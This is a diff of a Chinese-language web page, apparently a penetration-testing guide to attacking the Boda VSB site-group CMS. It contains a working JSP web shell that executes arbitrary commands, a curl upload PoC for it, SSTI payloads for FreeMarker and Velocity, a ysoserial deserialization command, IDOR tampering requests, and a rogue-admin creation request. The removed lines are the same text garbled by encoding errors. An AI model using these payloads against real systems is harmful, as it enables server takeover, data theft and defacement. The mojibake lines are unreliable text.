+<td align="left">跨站篡改&#x2F;数据窃取</td>
+<td align="left"><code>/api/article/edit?id=</code></td>
+</tr>
+<tr>
+<td align="left">垂直越权</td>
+<td align="center">⭐⭐⭐⭐</td>
+<td align="center">低</td>
+<td align="left">权限提升至管理员</td>
+<td align="left"><code>/api/user/add?role=admin</code></td>
+</tr>
+<tr>
+<td align="left">任意密码重置</td>
+<td align="center">⭐⭐⭐⭐</td>
+<td align="center">低</td>
+<td align="left">接管管理员账号</td>
+<td align="left"><code>/api/user/resetPwd</code></td>
+</tr>
+<tr>
+<td align="left">SQL 注入</td>
+<td align="center">⭐⭐⭐⭐</td>
+<td align="center">中</td>
+<td align="left">拖库&#x2F;后台登录绕过</td>
+<td align="left"><code>/api/site/list?siteId=</code></td>
+</tr>
+<tr>
+<td align="left">SSRF</td>
+<td align="center">⭐⭐⭐</td>
+<td align="center">低</td>
+<td align="left">内网探测</td>
+<td align="left"><code>/api/import?url=</code></td>
+</tr>
+<tr>
+<td align="left">目录遍历</td>
+<td align="center">⭐⭐⭐</td>
+<td align="center">低</td>
+<td align="left">源码泄露</td>
+<td align="left"><code>/api/download?file=</code></td>
+</tr>
+<tr>
+<td align="left">Druid 监控泄露</td>
+<td align="center">⭐⭐⭐</td>
+<td align="center">极低</td>
+<td align="left">SQL 监控 + Session</td>
+<td align="left"><code>/druid/index.html</code></td>
+</tr>
+<tr>
+<td align="left">Swagger 文档泄露</td>
+<td align="center">⭐⭐⭐</td>
+<td align="center">极低</td>
+<td align="left">全量 API 泄露</td>
+<td align="left"><code>/swagger-ui.html</code></td>
+</tr>
+<tr>
+<td align="left">XSS (存储型)</td>
+<td align="center">⭐⭐⭐</td>
+<td align="center">低</td>
+<td align="left">钓鱼&#x2F;管理员劫持</td>
+<td align="left"><code>/api/comment/add</code></td>
+</tr>
+<tr>
+<td align="left">弱口令 &#x2F; 默认密码</td>
+<td align="center">⭐⭐⭐</td>
+<td align="center">极低</td>
+<td align="left">直接登录后台</td>
+<td align="left"><code>/vsb/admin/</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="三、高危漏洞（P0-P1）"><a href="#三、高危漏洞（P0-P1）" class="headerlink" title="三、高危漏洞（P0-P1）"></a>三、高危漏洞（P0-P1）</h2><h3 id="3-1-任意文件上传-→-Getshell"><a href="#3-1-任意文件上传-→-Getshell" class="headerlink" title="3.1 任意文件上传 → Getshell"></a>3.1 任意文件上传 → Getshell</h3><p><strong>风险</strong>：⭐ 最高危 — 可直接获取服务器权限</p>
+<p>博达站群系统的<strong>模板管理、附件上传、站点备份恢复</strong>等功能模块，如果 API 未鉴权，攻击者可以直接上传 JSP&#x2F;WAR 文件至可解析目录。</p>
+<h4 id="检测入口"><a href="#检测入口" class="headerlink" title="检测入口"></a>检测入口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 常见上传端点（需实际抓取或 JS 反编译确认）</span><br><span class="line">POST /api/upload</span><br><span class="line">POST /api/file/upload</span><br><span class="line">POST /vsb/uploadFile</span><br><span class="line">POST /cms/api/upload</span><br><span class="line">POST /siteadmin/upload</span><br><span class="line">POST /vsb/template/upload</span><br></pre></td></tr></table></figure>
+
+<h4 id="测试-PoC"><a href="#测试-PoC" class="headerlink" title="测试 PoC"></a>测试 PoC</h4><p><strong>curl 测试（Windows PowerShell 兼容）：</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 尝试上传 JSP 木马</span></span><br><span class="line"><span class="built_in">curl</span> <span class="literal">-X</span> POST <span class="string">&quot;http://target.com/api/upload&quot;</span> `</span><br><span class="line">  <span class="operator">-F</span> <span class="string">&quot;file=@shell.jsp&quot;</span> `</span><br><span class="line">  <span class="operator">-F</span> <span class="string">&quot;dir=upload&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 返回路径如 /upload/202607/shell.jsp</span></span><br><span class="line"><span class="comment"># 3. 访问确认</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://target.com/upload/202607/shell.jsp&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>JSP 马内容示例：</strong></p>
 <figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">  <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(p.getInputStream()));</span><br><span class="line">    String line; </span><br><span class="line">    <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">      out.println(line + <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
 
 <blockquote>
-<p>娉ㄦ剰锛氬疄闄呰矾寰勯渶娴嬭瘯 <code>/upload/</code>銆乣&#x2F;vsb&#x2F;upload&#x2F;<code>銆乣/files/</code> 绛夊父瑙佸彲鍐欏彲鎵ц鐩綍銆?</p>
+<p>注意：实际路径需测试 <code>/upload/</code>、<code>/vsb/upload/</code>、<code>/files/</code> 等常见可写可执行目录。</p>
 </blockquote>
 <hr>
-<h3 id="3-2-妯℃澘娉ㄥ叆-SSTI-鈫-RCE"><a href="#3-2-妯℃澘娉ㄥ叆-SSTI-鈫-RCE" class="headerlink" title="3.2 妯℃澘娉ㄥ叆 &#x2F; SSTI 鈫?RCE"></a>3.2 妯℃澘娉ㄥ叆 &#x2F; SSTI 鈫?RCE</h3><p><strong>椋庨櫓</strong>锛氣瓙 鏋侀珮 鈥?鍗氳揪 VSB 鏈夊彲瑙嗗寲妯℃澘璁捐妯″潡</p>
-<p>鍗氳揪绔欑兢鐨勬牳蹇冨姛鑳戒箣涓€鏄?*妯℃澘绠＄悊**锛屾敮鎸佸彲瑙嗗寲缂栬緫 HTML 妯℃澘銆傚鏋滄ā鏉夸繚瀛?缂栬緫 API 鏈壌鏉冿紝鍙€氳繃妯℃澘寮曟搸娉ㄥ叆鎵ц浠绘剰浠ｇ爜銆?</p>
-<h4 id="妫€娴嬪叆鍙"><a href="#妫€娴嬪叆鍙" class="headerlink" title="妫€娴嬪叆鍙?"></a>妫€娴嬪叆鍙?</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /api/template/save</span><br><span class="line">POST /api/template/edit</span><br><span class="line">POST /vsb/template/save</span><br><span class="line">POST /cms/template/create</span><br></pre></td></tr></table></figure>
+<h3 id="3-2-模板注入-SSTI-→-RCE"><a href="#3-2-模板注入-SSTI-→-RCE" class="headerlink" title="3.2 模板注入 &#x2F; SSTI → RCE"></a>3.2 模板注入 &#x2F; SSTI → RCE</h3><p><strong>风险</strong>：⭐ 极高 — 博达 VSB 有可视化模板设计模块</p>
+<p>博达站群的核心功能之一是<strong>模板管理</strong>，支持可视化编辑 HTML 模板。如果模板保存&#x2F;编辑 API 未鉴权，可通过模板引擎注入执行任意代码。</p>
+<h4 id="检测入口-1"><a href="#检测入口-1" class="headerlink" title="检测入口"></a>检测入口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /api/template/save</span><br><span class="line">POST /api/template/edit</span><br><span class="line">POST /vsb/template/save</span><br><span class="line">POST /cms/template/create</span><br></pre></td></tr></table></figure>
 
-<h4 id="鍒╃敤鎬濊矾"><a href="#鍒╃敤鎬濊矾" class="headerlink" title="鍒╃敤鎬濊矾"></a>鍒╃敤鎬濊矾</h4><p>鍗氳揪鍩轰簬 Java 鎶€鏈爤锛屽叾妯℃澘寮曟搸鍙兘鍩轰簬 FreeMarker銆乂elocity 鎴栬嚜瀹氫箟寮曟搸銆係STI 娴嬭瘯鏂瑰紡锛?</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># FreeMarker 娴嬭瘯 payload</span><br><span class="line">$&#123;7*7&#125;</span><br><span class="line">&lt;#assign x=&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;x(&quot;whoami&quot;)&#125;</span><br><span class="line"></span><br><span class="line"># Velocity 娴嬭瘯 payload</span><br><span class="line">#set($x=7*7)$x</span><br><span class="line">#set($e=&quot;Runtime&quot;)$e.getRuntime().exec(&quot;whoami&quot;)</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="3-3-鍙嶅簭鍒楀寲-鈫-RCE"><a href="#3-3-鍙嶅簭鍒楀寲-鈫-RCE" class="headerlink" title="3.3 鍙嶅簭鍒楀寲 鈫?RCE"></a>3.3 鍙嶅簭鍒楀寲 鈫?RCE</h3><p><strong>椋庨櫓</strong>锛氣瓙 鏋侀珮 鈥?褰卞搷闈㈠箍</p>
-<p>鍗氳揪鍩轰簬 Java 鎶€鏈爤锛屽鏋滅郴缁熶娇鐢ㄤ簡 Java 鍘熺敓搴忓垪鍖栧崗璁紙RMI&#x2F;Hessian&#x2F;Spring 鍗忚锛夛紝涓?API 鏈壌鏉冿紝鍙Е鍙戝弽搴忓垪鍖?RCE銆?</p>
-<h4 id="妫€娴嬪叆鍙-1"><a href="#妫€娴嬪叆鍙-1" class="headerlink" title="妫€娴嬪叆鍙?"></a>妫€娴嬪叆鍙?</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /services/xxx  锛圵ebService 绔偣锛?POST /vsb/rmi</span><br><span class="line">POST /api/invoke</span><br></pre></td></tr></table></figure>
-
-<h4 id="鍒╃敤鎬濊矾-1"><a href="#鍒╃敤鎬濊矾-1" class="headerlink" title="鍒╃敤鎬濊矾"></a>鍒╃敤鎬濊矾</h4><p>浣跨敤 <code>ysoserial</code> 鐢熸垚 Payload锛?</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 浣跨敤 ysoserial 妫€娴?java -jar ysoserial.jar CommonsCollections5 &quot;whoami&quot; &gt; payload.bin</span></span><br><span class="line">curl -X POST <span class="string">&quot;http://target.com/services/xxx&quot;</span> --data-binary @payload.bin</span><br></pre></td></tr></table></figure>
+<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>博达基于 Java 技术栈，其模板引擎可能基于 FreeMarker、Velocity 或自定义引擎。SSTI 测试方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># FreeMarker 测试 payload</span><br><span class="line">$&#123;7*7&#125;</span><br><span class="line">&lt;#assign x=&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;x(&quot;whoami&quot;)&#125;</span><br><span class="line"></span><br><span class="line"># Velocity 测试 payload</span><br><span class="line">#set($x=7*7)$x</span><br><span class="line">#set($e=&quot;Runtime&quot;)$e.getRuntime().exec(&quot;whoami&quot;)</span><br></pre></td></tr></table></figure>
 
 <hr>
-<h3 id="3-4-浠绘剰鍛戒护鎵ц"><a href="#3-4-浠绘剰鍛戒护鎵ц" class="headerlink" title="3.4 浠绘剰鍛戒护鎵ц"></a>3.4 浠绘剰鍛戒护鎵ц</h3><p><strong>椋庨櫓</strong>锛氣瓙 鏋侀珮</p>
-<p>鑻?API 绔偣鐩存帴璋冪敤 <code>Runtime.exec()</code> 鎴栬剼鏈紩鎿庢墽琛岀敤鎴疯緭鍏ワ紝涓旀湭閴存潈锛屽彲鐩存帴 RCE銆?</p>
-<h4 id="甯歌瑙﹀彂鐐"><a href="#甯歌瑙﹀彂鐐" class="headerlink" title="甯歌瑙﹀彂鐐?"></a>甯歌瑙﹀彂鐐?</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 鍗氳揪绯荤粺鍙兘瀛樺湪绯荤粺鍛戒护璋冪敤鎺ュ彛</span><br><span class="line">POST /api/tool/exec</span><br><span class="line">POST /vsb/command</span><br><span class="line">GET /api/util/cmd?cmd=whoami</span><br></pre></td></tr></table></figure>
+<h3 id="3-3-反序列化-→-RCE"><a href="#3-3-反序列化-→-RCE" class="headerlink" title="3.3 反序列化 → RCE"></a>3.3 反序列化 → RCE</h3><p><strong>风险</strong>：⭐ 极高 — 影响面广</p>
+<p>博达基于 Java 技术栈，如果系统使用了 Java 原生序列化协议（RMI&#x2F;Hessian&#x2F;Spring 协议），且 API 未鉴权，可触发反序列化 RCE。</p>
+<h4 id="检测入口-2"><a href="#检测入口-2" class="headerlink" title="检测入口"></a>检测入口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /services/xxx  （WebService 端点）</span><br><span class="line">POST /vsb/rmi</span><br><span class="line">POST /api/invoke</span><br></pre></td></tr></table></figure>
+
+<h4 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h4><p>使用 <code>ysoserial</code> 生成 Payload：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 ysoserial 检测</span></span><br><span class="line">java -jar ysoserial.jar CommonsCollections5 <span class="string">&quot;whoami&quot;</span> &gt; payload.bin</span><br><span class="line">curl -X POST <span class="string">&quot;http://target.com/services/xxx&quot;</span> --data-binary @payload.bin</span><br></pre></td></tr></table></figure>
 
 <hr>
-<h2 id="鍥涖€佷腑楂樺嵄婕忔礊锛圥1-P2锛"><a href="#鍥涖€佷腑楂樺嵄婕忔礊锛圥1-P2锛" class="headerlink" title="鍥涖€佷腑楂樺嵄婕忔礊锛圥1-P2锛?"></a>鍥涖€佷腑楂樺嵄婕忔礊锛圥1-P2锛?</h2><h3 id="4-1-鏁忔劅淇℃伅娉勯湶"><a href="#4-1-鏁忔劅淇℃伅娉勯湶" class="headerlink" title="4.1 鏁忔劅淇℃伅娉勯湶"></a>4.1 鏁忔劅淇℃伅娉勯湶</h3><p><strong>椋庨櫓</strong>锛氫腑楂樺嵄 鈥?甯稿父鏄繛閿佹敾鍑荤殑绗竴姝?<br>API 鏈巿鏉冪洿鎺ヨ繑鍥炴暟鎹簱杩炴帴淇℃伅銆佺鐞嗗憳璐﹀彿銆丅ucket 鍑嵁銆佸瘑閽ョ瓑鏁忔劅鏁版嵁銆?</p>
-<h4 id="娴嬭瘯璺緞"><a href="#娴嬭瘯璺緞" class="headerlink" title="娴嬭瘯璺緞"></a>娴嬭瘯璺緞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /api/config</span><br><span class="line">GET /api/system/config</span><br><span class="line">GET /api/database</span><br><span class="line">GET /api/db/info</span><br><span class="line">GET /api/user/list</span><br><span class="line">GET /api/admin/list</span><br><span class="line">GET /api/user/info</span><br><span class="line">GET /api/site/list</span><br></pre></td></tr></table></figure>
-
-<h4 id="棰勬湡鍝嶅簲锛圝SON-鏍煎紡锛"><a href="#棰勬湡鍝嶅簲锛圝SON-鏍煎紡锛" class="headerlink" title="棰勬湡鍝嶅簲锛圝SON 鏍煎紡锛?"></a>棰勬湡鍝嶅簲锛圝SON 鏍煎紡锛?</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;db_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jdbc:postgresql://10.x.x.x:5432/vsb9&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;db_user&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vsbadmin&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;db_pass&quot;</span><span class="punctuation">:</span> <span class="string">&quot;VSB@2020#Secure&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;admin_list&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span> <span class="string">&quot;root&quot;</span><span class="punctuation">,</span> <span class="string">&quot;zhang...&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<h3 id="3-4-任意命令执行"><a href="#3-4-任意命令执行" class="headerlink" title="3.4 任意命令执行"></a>3.4 任意命令执行</h3><p><strong>风险</strong>：⭐ 极高</p>
+<p>若 API 端点直接调用 <code>Runtime.exec()</code> 或脚本引擎执行用户输入，且未鉴权，可直接 RCE。</p>
+<h4 id="常见触发点"><a href="#常见触发点" class="headerlink" title="常见触发点"></a>常见触发点</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 博达系统可能存在系统命令调用接口</span><br><span class="line">POST /api/tool/exec</span><br><span class="line">POST /vsb/command</span><br><span class="line">GET /api/util/cmd?cmd=whoami</span><br></pre></td></tr></table></figure>
 
 <hr>
-<h3 id="4-2-姘村钩瓒婃潈锛圛DOR锛"><a href="#4-2-姘村钩瓒婃潈锛圛DOR锛" class="headerlink" title="4.2 姘村钩瓒婃潈锛圛DOR锛?"></a>4.2 姘村钩瓒婃潈锛圛DOR锛?</h3><p><strong>椋庨櫓</strong>锛氫腑楂樺嵄 鈥?璺ㄧ珯鏁版嵁绡℃敼&#x2F;娉勯湶</p>
-<p>API 鍙獙璇佷簡鐧诲綍鐘舵€佷絾鏈獙璇佽祫婧愬綊灞烇紝閫氳繃閬嶅巻 ID 鍙搷浣滃叾浠栫珯鐐圭殑鏁版嵁銆?</p>
-<h4 id="娴嬭瘯鍦烘櫙"><a href="#娴嬭瘯鍦烘櫙" class="headerlink" title="娴嬭瘯鍦烘櫙"></a>娴嬭瘯鍦烘櫙</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 姝ｅ父璇锋眰锛氭煡鐪?ID=1 鐨勬枃绔?curl &quot;http://target.com/api/article/get?id=1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 瓒婃潈娴嬭瘯锛氶亶鍘?ID=2,3,4...</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://target.com/api/article/get?id=2&quot;</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://target.com/api/article/edit?id=2&amp;title=宸茬鏀?</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 鍗氳揪绔欑兢鐗硅壊锛歴iteId 鍙傛暟閬嶅巻</span></span><br><span class="line"><span class="string">curl &quot;</span>http://target.com/api/article/list?siteId=<span class="number">1</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">curl &quot;</span>http://target.com/api/article/list?siteId=<span class="number">2</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">curl &quot;</span>http://target.com/api/article/list?siteId=<span class="number">3</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
+<h2 id="四、中高危漏洞（P1-P2）"><a href="#四、中高危漏洞（P1-P2）" class="headerlink" title="四、中高危漏洞（P1-P2）"></a>四、中高危漏洞（P1-P2）</h2><h3 id="4-1-敏感信息泄露"><a href="#4-1-敏感信息泄露" class="headerlink" title="4.1 敏感信息泄露"></a>4.1 敏感信息泄露</h3><p><strong>风险</strong>：中高危 — 常常是连锁攻击的第一步</p>
+<p>API 未授权直接返回数据库连接信息、管理员账号、Bucket 凭据、密钥等敏感数据。</p>
+<h4 id="测试路径"><a href="#测试路径" class="headerlink" title="测试路径"></a>测试路径</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /api/config</span><br><span class="line">GET /api/system/config</span><br><span class="line">GET /api/database</span><br><span class="line">GET /api/db/info</span><br><span class="line">GET /api/user/list</span><br><span class="line">GET /api/admin/list</span><br><span class="line">GET /api/user/info</span><br><span class="line">GET /api/site/list</span><br></pre></td></tr></table></figure>
 
-<h4 id="鍒╃敤閾"><a href="#鍒╃敤閾" class="headerlink" title="鍒╃敤閾?"></a>鍒╃敤閾?</h4><ol>
-<li>閬嶅巻 <code>siteId</code> 鈫?鍙戠幇闅愯棌绔欑偣锛堝鍐呯綉绠＄悊绔欑偣锛?2. 閬嶅巻 <code>articleId</code> 鈫?鑾峰彇鏈叕寮€鏁忔劅鏂囩珷</li>
-<li>淇敼浠栦汉鏂囩珷 鈫?妞嶅叆 XSS 鎴栨伓鎰忓唴瀹?</li>
+<h4 id="预期响应（JSON-格式）"><a href="#预期响应（JSON-格式）" class="headerlink" title="预期响应（JSON 格式）"></a>预期响应（JSON 格式）</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;db_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jdbc:postgresql://10.x.x.x:5432/vsb9&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;db_user&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vsbadmin&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;db_pass&quot;</span><span class="punctuation">:</span> <span class="string">&quot;VSB@2020#Secure&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;admin_list&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span> <span class="string">&quot;root&quot;</span><span class="punctuation">,</span> <span class="string">&quot;zhang...&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="4-2-水平越权（IDOR）"><a href="#4-2-水平越权（IDOR）" class="headerlink" title="4.2 水平越权（IDOR）"></a>4.2 水平越权（IDOR）</h3><p><strong>风险</strong>：中高危 — 跨站数据篡改&#x2F;泄露</p>
+<p>API 只验证了登录状态但未验证资源归属，通过遍历 ID 可操作其他站点的数据。</p>
+<h4 id="测试场景"><a href="#测试场景" class="headerlink" title="测试场景"></a>测试场景</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 正常请求：查看 ID=1 的文章</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://target.com/api/article/get?id=1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 越权测试：遍历 ID=2,3,4...</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://target.com/api/article/get?id=2&quot;</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://target.com/api/article/edit?id=2&amp;title=已篡改&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 博达站群特色：siteId 参数遍历</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://target.com/api/article/list?siteId=1&quot;</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://target.com/api/article/list?siteId=2&quot;</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://target.com/api/article/list?siteId=3&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h4><ol>
+<li>遍历 <code>siteId</code> → 发现隐藏站点（如内网管理站点）</li>
+<li>遍历 <code>articleId</code> → 获取未公开敏感文章</li>
+<li>修改他人文章 → 植入 XSS 或恶意内容</li>
 </ol>
 <hr>
-<h3 id="4-3-鍨傜洿瓒婃潈-浠绘剰鐢ㄦ埛娣诲姞"><a href="#4-3-鍨傜洿瓒婃潈-浠绘剰鐢ㄦ埛娣诲姞" class="headerlink" title="4.3 鍨傜洿瓒婃潈 &#x2F; 浠绘剰鐢ㄦ埛娣诲姞"></a>4.3 鍨傜洿瓒婃潈 &#x2F; 浠绘剰鐢ㄦ埛娣诲姞</h3><p><strong>椋庨櫓</strong>锛氫腑楂樺嵄 鈥?鐩存帴鍒涘缓绠＄悊鍛?<br>鐢ㄦ埛绠＄悊 API 鏈牎楠岃鑹插弬鏁帮紝鏅€氭潈闄愭垨鏈櫥褰曞嵆鍙垱寤虹鐞嗗憳璐﹀彿銆?</p>
-<h4 id="娴嬭瘯璺緞-1"><a href="#娴嬭瘯璺緞-1" class="headerlink" title="娴嬭瘯璺緞"></a>娴嬭瘯璺緞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /api/user/add</span><br><span class="line">POST /api/user/create</span><br><span class="line">POST /api/admin/add</span><br><span class="line">POST /vsb/user/register</span><br></pre></td></tr></table></figure>
+<h3 id="4-3-垂直越权-任意用户添加"><a href="#4-3-垂直越权-任意用户添加" class="headerlink" title="4.3 垂直越权 &#x2F; 任意用户添加"></a>4.3 垂直越权 &#x2F; 任意用户添加</h3><p><strong>风险</strong>：中高危 — 直接创建管理员</p>
+<p>用户管理 API 未校验角色参数，普通权限或未登录即可创建管理员账号。</p>
+<h4 id="测试路径-1"><a href="#测试路径-1" class="headerlink" title="测试路径"></a>测试路径</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /api/user/add</span><br><span class="line">POST /api/user/create</span><br><span class="line">POST /api/admin/add</span><br><span class="line">POST /vsb/user/register</span><br></pre></td></tr></table></figure>
 
-<h4 id="娴嬭瘯-PoC"><a href="#娴嬭瘯-PoC" class="headerlink" title="娴嬭瘯 PoC"></a>娴嬭瘯 PoC</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">curl</span> <span class="literal">-X</span> POST <span class="string">&quot;http://target.com/api/user/add&quot;</span> `</span><br><span class="line">  <span class="literal">-H</span> <span class="string">&quot;Content-Type: application/json&quot;</span> `</span><br><span class="line">  <span class="literal">-d</span> <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">    &quot;username&quot;: &quot;hacker&quot;,</span></span><br><span class="line"><span class="string">    &quot;password&quot;: &quot;Hacker123!&quot;,</span></span><br><span class="line"><span class="string">    &quot;role&quot;: &quot;admin&quot;,</span></span><br><span class="line"><span class="string">    &quot;email&quot;: &quot;hacker@evil.com&quot;</span></span><br><span class="line"><span class="string">  &#125;&#x27;</span></span><br></pre></td></tr></table></figure>
-
